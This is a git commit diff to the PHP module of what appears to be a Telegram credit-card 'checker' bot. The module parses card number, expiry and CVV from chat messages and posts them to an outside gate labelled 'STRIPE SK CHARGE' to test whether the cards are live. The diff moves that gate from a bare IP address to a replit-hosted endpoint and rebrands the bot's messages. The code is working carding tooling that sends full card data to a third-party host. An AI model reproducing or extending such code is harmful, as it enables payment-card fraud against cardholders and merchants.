ab09f4a6fcb122e6ca4c1a1bfc8c3bb75c74dcec
Art <121850372+arterxsk@users.noreply.github.com>
2023-06-02 02:43:07 +0800

    update modules/ch.php

--- modules/ch.php
+++ modules/ch.php
@@ -10,13 +10,13 @@ $mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
 $ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
 $cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
   $lista = "$cc|$mes|$ano|$cvv";
-   $sendmes = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=".$chatId."&text=<b>HECKER CHK ⚡️ - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] CC: ".$lista."%0A[ϟ] STATUS: BEING CHECKED,PELASE WAIT.%0A━━━━━━━━━━━━━</b>&reply_to_message_id=".$message_id."&parse_mode=HTML";
+   $sendmes = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=".$chatId."&text=<b>✦ 𝗮𝗿𝘁𝗲𝗿𝘅𝘀𝗸 𝗰𝗵𝗸 ! - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] CC: ".$lista."%0A[ϟ] STATUS: BEING CHECKED,PELASE WAIT.%0A━━━━━━━━━━━━━</b>&reply_to_message_id=".$message_id."&parse_mode=HTML";
   
     $sent = json_decode(file_get_contents($sendmes) ,1);
       $mes_id = $sent['result']['message_id'];
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'http://20.212.107.64/skbasedchk/gate/usd0.5.php?lista='.$lista.'');
+curl_setopt($ch, CURLOPT_URL, 'https://response.artsvn.repl.co/api2.php?lista='.$lista.'');
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $fimaa = curl_exec($ch);
@@ -78,7 +78,7 @@ $isbug = $f;
   $binrs = "<b>━━━━━━━━━━━━━%0A[ϟ] BIN: $bin%0A[ϟ] COUNTRY: $country $emoji%0A[ϟ] BRAND: $brand%0A[ϟ] LEVEL: $scheme%0A[ϟ] TYPE: $type%0A[ϟ] BANK: $bank</b>";
 $time_end = microtime(true);
   $execution_time = ($time_end - $time_start);
-  editMessage($chatId, "<b>HECKER CHK ⚡️ - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] GATE: STRIPE SK CHARGE%0A[ϟ] CC: <code>$lista</code>%0A[ϟ] STATUS: $pass%0A[ϟ] RESPONSE: $msg%0A[ϟ] BUG BIN: $isbug%0A$binrs%0A━━━━━━━━━━━━━%0A[ϟ] TIME TAKEN: $execution_time's%0A[ϟ] Checked By: @$username%0A[ϟ] UserID: $userId%0A[ϟ] Premium Activated: $stat%0A</b>",$mes_id);
+  editMessage($chatId, "<b>✦ 𝗮𝗿𝘁𝗲𝗿𝘅𝘀𝗸 𝗰𝗵𝗸 ! - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] GATE: STRIPE SK CHARGE%0A[ϟ] CC: <code>$lista</code>%0A[ϟ] STATUS: $pass%0A[ϟ] RESPONSE: $msg%0A[ϟ] BUG BIN: $isbug%0A$binrs%0A━━━━━━━━━━━━━%0A[ϟ] TIME TAKEN: $execution_time's%0A[ϟ] Checked By: @$username%0A[ϟ] UserID: $userId%0A[ϟ] Premium Activated: $stat%0A</b>",$mes_id);
 }
 
 else {
